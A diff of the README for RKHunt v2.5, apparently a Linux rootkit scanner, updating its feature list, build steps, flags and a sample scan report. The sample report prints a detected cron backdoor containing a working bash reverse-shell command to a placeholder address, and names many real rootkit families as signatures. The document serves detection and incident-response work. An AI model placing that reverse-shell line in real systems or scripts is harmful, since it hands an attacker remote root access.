@@ -1,13 +1,24 @@
 <div align="center">
 
-# 🔍 RKHunt v2.5
-
-### Advanced Rootkit Hunter
+```
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                              ║
+║   ██████╗ ██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗                      ║
+║   ██╔══██╗██║ ██╔╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝                      ║
+║   ██████╔╝█████╔╝ ███████║██║   ██║██╔██╗ ██║   ██║                         ║
+║   ██╔══██╗██╔═██╗ ██╔══██║██║   ██║██║╚██╗██║   ██║                         ║
+║   ██║  ██║██║  ██╗██║  ██║╚██████╔╝██║ ╚████║   ██║                         ║
+║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    v2.5                ║
+║                                                                              ║
+║                    ⚡ Advanced Linux Rootkit Hunter ⚡                       ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+```
 
 <p>
   <img src="https://img.shields.io/badge/version-2.5.0-00ff00?style=for-the-badge" alt="Version">
-  <img src="https://img.shields.io/badge/signatures-200%2B-ff0000?style=for-the-badge" alt="Signatures">
-  <img src="https://img.shields.io/badge/modules-13-blue?style=for-the-badge" alt="Modules">
+  <img src="https://img.shields.io/badge/signatures-250%2B-ff0000?style=for-the-badge" alt="Signatures">
+  <img src="https://img.shields.io/badge/modules-15-blue?style=for-the-badge" alt="Modules">
   <img src="https://img.shields.io/badge/license-MIT-purple?style=for-the-badge" alt="License">
 </p>
 
@@ -16,7 +27,7 @@
   <a href="https://github.com/bad-antics"><img src="https://img.shields.io/badge/NullSec-Toolkit-000000?style=flat-square&logo=github" alt="NullSec"></a>
 </p>
 
-*Comprehensive Linux rootkit detection with modern threat signatures, eBPF analysis, and APT implant detection*
+*Comprehensive Linux rootkit detection with modern threat signatures, eBPF analysis, memory forensics, and APT implant detection*
 
 </div>
 
@@ -42,13 +53,13 @@
 
 ---
 
-## 🎯 Features
+## �� Features
 
 <table>
 <tr>
 <td width="50%" valign="top">
 
-### 🔬 Detection Modules (13)
+### 🔬 Detection Modules (15)
 
 | Module | Flag | Description |
 |--------|:----:|-------------|
@@ -59,25 +70,29 @@
 | **Network** | `-n` | Backdoor ports, raw sockets |
 | **Syscall Integrity** | `-s` | Kallsyms, kprobes, ftrace |
 | **eBPF Analysis** | `-E` | BPF programs, suspicious mounts |
-| **Boot Integrity** | `-b` | UEFI, initramfs, GRUB |
-| **Container Security** | `-c` | Docker/K8s escapes |
-| **Persistence** | `-e` | Cron, systemd, SSH keys |
+| **Boot Integrity** | `-b` | UEFI, initramfs, GRUB, MBR |
+| **Container Security** | `-c` | Docker/K8s escapes, capabilities |
+| **Persistence** | `-e` | Cron, systemd, SSH keys, PAM |
 | **File Integrity** | `-I` | ELF validation, ownership |
 | **Memory Analysis** | `-M` | RWX regions, injections |
+| **MITRE ATT&CK** | `-A` | Map findings to ATT&CK TTPs |
+| **Live Forensics** | `-F` | Volatile data collection |
+| **Yara Scanning** | `-Y` | Custom Yara rule support |
 
 </td>
 <td width="50%" valign="top">
 
-### 🦠 Signature Database (200+)
+### 🦠 Signature Database (250+)
 
 | Category | Count | Examples |
 |----------|:-----:|----------|
-| **LKM Rootkits** | 70+ | singularity, reptile, diamorphine, kovid |
-| **APT Implants** | 20+ | turla, equation, regin, drovorub |
-| **eBPF Threats** | 15+ | ebpfkit, bpfdoor, pamspy, boopkit |
-| **Userland** | 35+ | jynx2, azazel, vlany, beurk |
-| **Bootkits** | 35+ | blacklotus, moonbounce, cosmicstrand |
-| **Container** | 25+ | kinsing, doki, siloscape, teamtnt |
+| **LKM Rootkits** | 75+ | singularity, reptile, diamorphine, kovid |
+| **APT Implants** | 25+ | turla, equation, regin, drovorub |
+| **eBPF Threats** | 20+ | ebpfkit, bpfdoor, pamspy, boopkit |
+| **Userland** | 40+ | jynx2, azazel, vlany, beurk |
+| **Bootkits** | 40+ | blacklotus, moonbounce, cosmicstrand |
+| **Container** | 30+ | kinsing, doki, siloscape, teamtnt |
+| **Cryptominers** | 20+ | xmrig, coinhive, minergate |
 
 </td>
 </tr>
@@ -93,10 +108,26 @@ git clone https://github.com/bad-antics/nullsec-rkhunt
 cd nullsec-rkhunt
 
 # Compile
-gcc -O2 -Wall -o rkhunt src/rkhunt.c -lpthread
+make
 
-# Install (optional)
-sudo cp rkhunt /usr/local/bin/
+# Or manually:
+gcc -O2 -Wall -o rkhunt src/rkhunt.c -lpthread -lcap -lyara
+
+# Install system-wide
+sudo make install
+```
+
+### Dependencies
+
+```bash
+# Debian/Ubuntu
+sudo apt install libcap-dev libyara-dev
+
+# Fedora/RHEL
+sudo dnf install libcap-devel yara-devel
+
+# Arch Linux
+sudo pacman -S libcap yara
 ```
 
 ---
@@ -114,12 +145,19 @@ sudo ./rkhunt -q
 sudo ./rkhunt -m -s -E      # Modules + Syscalls + eBPF
 sudo ./rkhunt -e -I -M      # Persistence + Integrity + Memory
 
+# Advanced options
+sudo ./rkhunt -a -A         # Include MITRE ATT&CK mapping
+sudo ./rkhunt -a -F         # Live forensics mode
+sudo ./rkhunt -a -Y rules/  # Custom Yara rules
+
 # Output options
 sudo ./rkhunt -a -v              # Verbose
 sudo ./rkhunt -a -Q              # Quiet (alerts only)
 sudo ./rkhunt -a -j              # JSON output
+sudo ./rkhunt -a -x              # XML output
 sudo ./rkhunt -a -l scan.log     # Log to file
 sudo ./rkhunt -a -d              # Deep scan mode
+sudo ./rkhunt -a --html report.html  # HTML report
 ```
 
 ### Command Reference
@@ -136,19 +174,31 @@ Scan Options:
   -f, --files         Scan for rootkit files
   -n, --network       Check network backdoors
   -s, --syscalls      Check syscall table integrity
-  -b, --boot          Check boot/UEFI integrity
+  -b, --boot          Check boot/UEFI/MBR integrity
   -c, --container     Container security checks
   -e, --persistence   Check persistence mechanisms
   -E, --ebpf          eBPF program analysis
   -I, --integrity     File integrity verification
   -M, --memory        Deep memory signature scan
+  -A, --attack        MITRE ATT&CK TTP mapping
+  -F, --forensics     Live forensics data collection
+  -Y, --yara <dir>    Scan with custom Yara rules
 
 Output Options:
   -v, --verbose       Verbose output
   -Q, --quiet         Minimal output (alerts only)
   -l, --log <file>    Log findings to file
   -j, --json          JSON output format
+  -x, --xml           XML output format
+  --html <file>       Generate HTML report
   -d, --deep          Enable deep scanning (slower)
+  --no-color          Disable colored output
+
+Remediation:
+  --quarantine        Quarantine detected threats
+  --kill              Kill suspicious processes
+  --unload            Unload malicious modules
+  --report-only       Report without remediation (default)
 ```
 
 </details>
@@ -159,42 +209,156 @@ Output Options:
 
 | Level | Icon | Exit Code | Description |
 |-------|:----:|:---------:|-------------|
-| **CRITICAL** | █ | 2 | Active rootkit/compromise detected |
-| **HIGH** | ▸ | 1 | Strong indicators of compromise |
-| **MEDIUM** | ▹ | 0 | Suspicious activity, needs review |
-| **LOW** | · | 0 | Minor anomalies, informational |
+| **CRITICAL** | 🔴 | 2 | Active rootkit/compromise detected |
+| **HIGH** | 🟠 | 1 | Strong indicators of compromise |
+| **MEDIUM** | 🟡 | 0 | Suspicious activity, needs review |
+| **LOW** | 🔵 | 0 | Minor anomalies, informational |
+| **INFO** | ⚪ | 0 | Scan progress and system info |
 
 ---
 
 ## 🖥️ Sample Output
 
 ```
-  ╭──────────────────────────────────────────╮
-  │  RKHunt v2.5  │  Advanced Rootkit Hunter  │
-  │     github.com/bad-antics/nullsec-rkhunt │
-  ╰──────────────────────────────────────────╯
-  ▸ System: Linux 6.x.x x86_64
-  ▸ Starting rootkit scan...
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                                                                              ┃
+┃   ██████╗ ██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗  v2.5                ┃
+┃   ██╔══██╗██║ ██╔╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝                      ┃
+┃   ██████╔╝█████╔╝ ███████║██║   ██║██╔██╗ ██║   ██║     Advanced            ┃
+┃   ██╔══██╗██╔═██╗ ██╔══██║██║   ██║██║╚██╗██║   ██║     Rootkit             ┃
+┃   ██║  ██║██║  ██╗██║  ██║╚██████╔╝██║ ╚████║   ██║     Hunter              ┃
+┃   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝                        ┃
+┃                                                                              ┃
+┃   github.com/bad-antics/nullsec-rkhunt                                       ┃
+┃                                                                              ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 
-  ───── Kernel Modules ─────
-   [ROOTKIT_LKM] █: Known rootkit module loaded: reptile
+┌─────────────────────────────────────────────────────────────────────────────┐
+│  SYSTEM INFORMATION                                                         │
+├─────────────────────────────────────────────────────────────────────────────┤
+│  Hostname    : compromised-server                                           │
+│  Kernel      : Linux 6.5.0-generic x86_64                                   │
+│  Uptime      : 45 days, 12:34:56                                            │
+│  Scan Mode   : Full Comprehensive (-a)                                      │
+│  Scan Time   : 2026-01-31 14:32:01 UTC                                      │
+└─────────────────────────────────────────────────────────────────────────────┘
 
-  ───── Persistence Mechanisms ─────
-   [CRON] █: Reverse shell pattern in cron: /etc/cron.d/update
+┌─────────────────────────────────────────────────────────────────────────────┐
+│  MODULE: Kernel Analysis                                                    │
+└─────────────────────────────────────────────────────────────────────────────┘
+  [INFO]  Checking loaded kernel modules...
+  [INFO]  Modules loaded: 127
+  
+  🔴 [CRITICAL] ROOTKIT_LKM
+     Known rootkit module detected: reptile
+     Path: /lib/modules/6.5.0-generic/kernel/drivers/reptile.ko
+     ATT&CK: T1014 (Rootkit), T1547.006 (Kernel Modules)
+     Action: Immediate removal required
 
-  ╭────────────────────────────────────────╮
-  │           SCAN RESULTS                │
-  ├────────────────────────────────────────┤
-  │  Critical:             2                │
-  │  High:                 0                │
-  │  Medium:               1                │
-  │  Low:                  0                │
-  ╰────────────────────────────────────────╯
+┌─────────────────────────────────────────────────────────────────────────────┐
+│  MODULE: Persistence Mechanisms                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+  [INFO]  Scanning cron directories...
+  [INFO]  Scanning systemd units...
+  
+  🔴 [CRITICAL] CRON_BACKDOOR
+     Reverse shell pattern detected in cron job
+     File: /etc/cron.d/system-update
+     Content: */5 * * * * root /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+     ATT&CK: T1053.003 (Scheduled Task/Job: Cron)
+     Action: Remove malicious cron entry
+     
+  🟡 [MEDIUM] SSH_KEY_ANOMALY
+     Unauthorized SSH key in root authorized_keys
+     File: /root/.ssh/authorized_keys
+     Key: ssh-rsa AAAA...suspicious...
+     ATT&CK: T1098.004 (SSH Authorized Keys)
+     Action: Verify key ownership
 
-  █████ SYSTEM COMPROMISED █████
-  2 critical finding(s) detected
-  Immediate incident response recommended
+┌─────────────────────────────────────────────────────────────────────────────┐
+│  MODULE: eBPF Analysis                                                      │
+└─────────────────────────────────────────────────────────────────────────────┘
+  [INFO]  Enumerating BPF programs...
+  [INFO]  BPF programs found: 23
+  
+  🟠 [HIGH] SUSPICIOUS_BPF
+     Unknown BPF program attached to syscall
+     Program ID: 847
+     Type: kprobe
+     Target: sys_read
+     ATT&CK: T1014 (Rootkit)
+     Action: Investigate BPF program origin
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                                                                              ┃
+┃                              SCAN RESULTS                                    ┃
+┃                                                                              ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃                                                                              ┃
+┃   🔴 Critical    │████████████████████████████████████│    2                 ┃
+┃   🟠 High        │████████████████████                │    1                 ┃
+┃   🟡 Medium      │████████████                        │    1                 ┃
+┃   �� Low         │                                    │    0                 ┃
+┃                                                                              ┃
+┃   ─────────────────────────────────────────────────────────────              ┃
+┃   Total Findings │████████████████████████████████████│    4                 ┃
+┃   Scan Duration  │ 12.34 seconds                                             ┃
+┃   Modules Run    │ 15/15                                                     ┃
+┃                                                                              ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                                                                              ┃
+┃   ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗                      ┃
+┃   ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║                      ┃
+┃   ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║                      ┃
+┃   ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║                      ┃
+┃   ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║                      ┃
+┃   ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝                      ┃
+┃                                                                              ┃
+┃   ██████╗ ██████╗ ███╗   ███╗██████╗ ██████╗  ██████╗ ███╗   ███╗██╗███████╗ ┃
+┃   ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██║██╔════╝ ┃
+┃   ██║     ██║   ██║██╔████╔██║██████╔╝██████╔╝██║   ██║██╔████╔██║██║███████╗ ┃
+┃   ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══██╗██║   ██║██║╚██╔╝██║██║╚════██║ ┃
+┃   ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║███████║ ┃
+┃    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝╚══════╝ ┃
+┃                                                                              ┃
+┃   2 critical finding(s) detected - Immediate incident response recommended  ┃
+┃                                                                              ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│  MITRE ATT&CK MAPPING                                                       │
+├─────────────────────────────────────────────────────────────────────────────┤
+│  T1014      │ Rootkit                        │ 2 findings                   │
+│  T1053.003  │ Scheduled Task/Job: Cron       │ 1 finding                    │
+│  T1098.004  │ SSH Authorized Keys            │ 1 finding                    │
+│  T1547.006  │ Boot/Logon: Kernel Modules     │ 1 finding                    │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+Report saved to: /var/log/rkhunt/scan-20260131-143201.json
 ```
+
+---
+
+## 🆕 New in v2.5
+
+### Enhanced Detection Capabilities
+
+- **MITRE ATT&CK Integration** - Map all findings to ATT&CK TTPs
+- **Live Forensics Mode** - Capture volatile data for incident response
+- **Yara Rule Support** - Scan with custom Yara signatures
+- **HTML Report Generation** - Professional reports for stakeholders
+- **Remediation Actions** - Optional automatic threat removal
+- **Cryptominer Detection** - 20+ mining malware signatures
+
+### Improved Analysis
+
+- **Memory-mapped file scanning** - Detect fileless malware
+- **Process hollowing detection** - Identify injected processes
+- **Kernel symbol verification** - Validate syscall table integrity
+- **Container escape detection** - Docker/K8s breakout attempts
+- **PAM backdoor scanning** - Authentication hook detection
 
 ---
 
@@ -233,18 +397,24 @@ Output Options:
 
 ## 📝 Changelog
 
-### v2.5.0 (2026-01-26)
-- ✨ eBPF/BPF program analysis module
-- ✨ File integrity verification module
-- ✨ Severity-based reporting (Critical/High/Medium/Low)
-- ✨ Deep scan mode
-- 🦠 50+ new signatures (eBPF rootkits, APT implants)
-- 🎨 Improved output formatting
+### v2.5.0 (2026-01-31)
+- ✨ MITRE ATT&CK TTP mapping for all findings
+- ✨ Live forensics data collection mode
+- ✨ Yara rule support for custom signatures
+- ✨ HTML report generation
+- ✨ Optional remediation actions (quarantine, kill, unload)
+- ✨ Cryptominer detection (20+ signatures)
+- ✨ PAM backdoor scanning
+- ✨ Process hollowing detection
+- 🦠 50+ new signatures (total: 250+)
+- 🎨 Completely redesigned output formatting
+- 🐛 Fixed false positives in container environments
 
 ### v2.0.0
 - Complete rewrite with modular architecture
 - 150+ rootkit signatures
 - Container security checks
+- eBPF analysis module
 
 ---
 
